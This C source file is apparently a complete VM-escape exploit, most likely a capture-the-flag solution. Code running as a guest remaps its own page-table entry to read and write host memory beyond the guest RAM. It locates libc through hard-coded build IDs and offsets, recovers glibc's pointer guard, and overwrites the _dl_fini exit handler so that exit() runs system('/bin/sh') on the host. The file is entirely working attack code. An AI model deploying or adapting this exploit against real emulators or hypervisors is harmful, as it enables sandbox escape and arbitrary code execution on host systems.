#define PAGE_SIZE 4096
#define PAGE_OFFSET_MASK (PAGE_SIZE - 1)
#define PTE_PADDR(entry) bits(entry, 36, 12)

typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;
typedef unsigned long long u64;

// from exit.h
// https://elixir.bootlin.com/glibc/glibc-2.41.9000/source/stdlib/exit.h
enum {
  ef_free, /* `ef_free' MUST be zero!  */
  ef_us,
  ef_on,
  ef_at,
  ef_cxa
};

// inline u64 bitmask(u8 high) {
//     return (high >= 64) ? ~0ULL : ((u64)(1) << high) - 1;
// }
// inline u64 bits(u64 val, u8 high, u8 low) {
//     return (val & bitmask(high + 1)) >> low;
// }

#define RAM_SIZE 0x400000 // TODO: make it work with smaller RAM size.
#define ELF_MAGIC 0x3010102464c457f
#define SHT_NOTE 0x7
#define NT_GNU_BUILD_ID 0x3

typedef struct {
  u64 build_id_start;      // first 8bytes of build_id as LE 64bit integer
  u64 base_to_data_offset; // offset from libc_base -> libc data offset
  u64 calloc_got_offset;   // offset from libc data segment -> calloc@got entry
  u64 calloc_offset;       // offset from libc_base -> calloc func
  u64 ld_base_dl_fini_offset;         // offset from ld_base -> _dl_fini func
  u64 system_offset;                  // offset from libc_base -> system func
  u64 bin_sh_str_offset;              // offset from libc_base -> /bin/sh string
  u64 dl_allocate_tls_got_offset;     // offset from libc data segment ->
                                      // _dl_allocate_tls@got entry
  u64 ld_base_dl_allocate_tls_offset; // offset from ld_base -> _dl_allocate_tls
                                      // func
  u64 initial_var_offset;             // offset from libc_base -> initial var
} LibcVersion;

static LibcVersion libc_versions[] = {
    {
        // docker
        // full hash is 58254ca972028402bc40624f81388d85ec95f70d
        .build_id_start = 0x02840272a94c2558,
        .base_to_data_offset = 0x1d2000,
        .calloc_got_offset = 0x38,
        .calloc_offset = 0x99610,
        .ld_base_dl_fini_offset = 0x4680,
        .system_offset = 0x4c490,
        .bin_sh_str_offset = 0x196031,
        .dl_allocate_tls_got_offset = 0x150,
        .ld_base_dl_allocate_tls_offset = 0x11650,
        .initial_var_offset = 0x1d42e0,
    },
    {
        // host
        // full hash is 490fef8403240c91833978d494d39e537409b92e
        .build_id_start = 0x910c240384ef0f49,
        .base_to_data_offset = 0x21a000,
        .calloc_got_offset = 0x50,
        .calloc_offset = 0xa6520,
        .ld_base_dl_fini_offset = 0x6040,
        .system_offset = 0x50d70,
        .bin_sh_str_offset = 0x1d8678,
        .dl_allocate_tls_got_offset = 0x170,
        .ld_base_dl_allocate_tls_offset = 0x147a0,
        .initial_var_offset = 0x21bf00,
    },

    // end marker
    {
        .build_id_start = 0x0,
    }};

#define bitmask(high) (((high) >= 64) ? ~0ULL : ((u64)(1) << (high)) - 1)
#define bits(val, high, low) (((val)&bitmask(high + 1)) >> low)

#define ror64(value, bit_count)                                                \
  (((u64)(value) >> bit_count) | ((u64)(value) << (64 - bit_count)))
#define rol64(value, bit_count)                                                \
  (((u64)(value) << bit_count) | ((u64)(value) >> (64 - bit_count)))

#define HLT() __asm__("hlt")
//#define INT3() __asm__ ("int3")
#define INT3()
#define READ_PAGE_OFFSET(offset)                                               \
  ({                                                                           \
    u64 _val;                                                                  \
    __asm__ volatile("movq (%1), %0"                                           \
                     : "=r"(_val)                                              \
                     : "r"(leak + ((offset)&PAGE_OFFSET_MASK))                 \
                     : "memory");                                              \
    _val;                                                                      \
  })
#define WRITE_PAGE_OFFSET(offset, value)                                       \
  ({                                                                           \
    __asm__ volatile("movq %1, (%0)"                                           \
                     :                                                         \
                     : "r"(leak + ((offset)&PAGE_OFFSET_MASK)), "r"(value)     \
                     : "memory");                                              \
  })
#define MAP_PAGE_TO_PAGE_FRAME(page_frame)                                     \
  ({                                                                           \
    *pte_ptr =                                                                 \
        bits(pte, 63, 37) << 37 | (u16)(page_frame) << 12 | bits(pte, 11, 0);  \
    __asm__("invlpg (%0)" ::"r"(leak));                                        \
  })
// returns the page frame number of the address at the end of our RAM buffer +
// offset
#define OFFSET_TO_PAGE_FRAME(offset) ((RAM_SIZE + (offset)) >> 12)

u8 leak[PAGE_SIZE] __attribute__((__aligned__(PAGE_SIZE)));

// Entry Point:
void _start() {
  u64 leak_addr = (u64)leak;

  // find pte that maps our leak_addr
  u64 cr3;
  __asm__ volatile("mov %%cr3, %0" : "=r"(cr3));
  u64 pml4e = *(u64 *)(PTE_PADDR(cr3) << 12 | bits(leak_addr, 47, 39) << 3);
  u64 pdpte = *(u64 *)(PTE_PADDR(pml4e) << 12 | bits(leak_addr, 38, 30) << 3);
  u64 pde = *(u64 *)(PTE_PADDR(pdpte) << 12 | bits(leak_addr, 29, 21) << 3);
  u64 *pte_ptr = (u64 *)(PTE_PADDR(pde) << 12 | bits(leak_addr, 20, 12) << 3);
  u64 pte = *pte_ptr;

  // ===============================================================

  // find libc
  u64 val = 0x0;
  u64 offset = 0x210000;
  u64 libc_base_offset = 0x0;
  LibcVersion *libc_version = 0x0;
  u64 consecutive_zeroes = 0;
  // first go backward until first elf or guard-page
  for (; offset >= 0; offset -= PAGE_SIZE) {
    MAP_PAGE_TO_PAGE_FRAME(OFFSET_TO_PAGE_FRAME(offset));
    val = READ_PAGE_OFFSET(0x0);
    if (val == ELF_MAGIC)
      break;
    if (val == 0 && ++consecutive_zeroes == 20) // TODO: identify guard page
      break;
    if (val != 0)
      consecutive_zeroes = 0;
  }

  INT3();

  // now go forward and find libc elf
  for (;; offset += PAGE_SIZE) {
    MAP_PAGE_TO_PAGE_FRAME(OFFSET_TO_PAGE_FRAME(offset));
    val = READ_PAGE_OFFSET(0x0);
    if (val == ELF_MAGIC) {
      // offset is now the elf base and leak is elf-base aligned
      // parse elf and see if it's libc
      for (u64 i = 0; i < 0x500; i += 8) {
        val = READ_PAGE_OFFSET(i);
        libc_version = libc_versions;
        for (; libc_version->build_id_start != 0; ++libc_version) {
          if (val == libc_version->build_id_start) {
            libc_base_offset = offset;
            INT3();
            goto exploit;
          }
        }
      }
    }
  }

  // We did not find libc base :(
  HLT();

  // ===============================================================
exploit:
  // map first libc data segment page
  MAP_PAGE_TO_PAGE_FRAME(OFFSET_TO_PAGE_FRAME(
      libc_base_offset +
      libc_version
          ->base_to_data_offset)); // distance libc_base libc_data_segment

  // read dl_allocate_tls address from libc GOT
  u64 dl_allocate_tls_addr =
      READ_PAGE_OFFSET(libc_version->dl_allocate_tls_got_offset);
  u64 ld_base =
      dl_allocate_tls_addr - libc_version->ld_base_dl_allocate_tls_offset;
  // read calloc address from libc GOT
  u64 calloc_addr = READ_PAGE_OFFSET(libc_version->calloc_got_offset);
  u64 libc_base = calloc_addr - libc_version->calloc_offset;

  u64 dl_fini_addr = ld_base + libc_version->ld_base_dl_fini_offset;
  u64 system_addr = libc_base + libc_version->system_offset;
  u64 bin_sh_str_addr = libc_base + libc_version->bin_sh_str_offset;

  u64 pointer_guard = 0x0;

  offset = libc_base_offset + libc_version->initial_var_offset;
  MAP_PAGE_TO_PAGE_FRAME(OFFSET_TO_PAGE_FRAME(offset));

  // read exit_function_list header
  u64 lp_next = READ_PAGE_OFFSET(offset);
  u64 lp_idx = READ_PAGE_OFFSET(offset + 0x8);
  // initial list has next == 0x0 and idx>0
  if (lp_next != 0 || lp_idx == 0)
    HLT();
  // advance offset to exit_function_list.fn[] array
  offset += 0x10;

  // iterate lp and find _dl_fini entry
  for (u64 i = 0; i <= lp_idx; ++i) {

    // read exit_function entry, remapping because of possible page overlapping
    // entry
    MAP_PAGE_TO_PAGE_FRAME(OFFSET_TO_PAGE_FRAME(offset));
    u64 flavor = READ_PAGE_OFFSET(offset);
    offset += 8;

    MAP_PAGE_TO_PAGE_FRAME(OFFSET_TO_PAGE_FRAME(offset));
    u64 fn = READ_PAGE_OFFSET(offset);
    offset += 8;

    MAP_PAGE_TO_PAGE_FRAME(OFFSET_TO_PAGE_FRAME(offset));
    u64 arg = READ_PAGE_OFFSET(offset);
    offset += 8;

    MAP_PAGE_TO_PAGE_FRAME(OFFSET_TO_PAGE_FRAME(offset));
    u64 dso_handle = READ_PAGE_OFFSET(offset);
    offset += 8;

    if (flavor == ef_cxa && arg == 0 && dso_handle == 0 && fn != 0) {
      // we found _dl_fini entry
      pointer_guard = ror64(fn, 0x11) ^ dl_fini_addr;
      INT3();
      break;
    }
  }

  // We didn't found _dl_fini entry :(
  if (pointer_guard == 0x0)
    HLT();

  u64 system_addr_mangled = rol64(system_addr ^ pointer_guard, 0x11);

  // overwrite _dl_fini entry with system("/bin/sh")
  offset -= 0x20;
  // flavor
  MAP_PAGE_TO_PAGE_FRAME(OFFSET_TO_PAGE_FRAME(offset));
  WRITE_PAGE_OFFSET(offset, ef_cxa);
  offset += 8;
  // fn
  MAP_PAGE_TO_PAGE_FRAME(OFFSET_TO_PAGE_FRAME(offset));
  WRITE_PAGE_OFFSET(offset, system_addr_mangled);
  offset += 8;
  // arg
  MAP_PAGE_TO_PAGE_FRAME(OFFSET_TO_PAGE_FRAME(offset));
  WRITE_PAGE_OFFSET(offset, bin_sh_str_addr);
  offset += 8;
  // dso_handle
  MAP_PAGE_TO_PAGE_FRAME(OFFSET_TO_PAGE_FRAME(offset));
  WRITE_PAGE_OFFSET(offset, 0x0);
  offset += 8;

  // ===============================================================

  INT3();
  // Clear Interrupts so that we don't get the vt100 interrupts
  __asm__("cli");
  // Trigger exit() call and with it our faked __exit_funcs entry
  __asm__("hlt");
}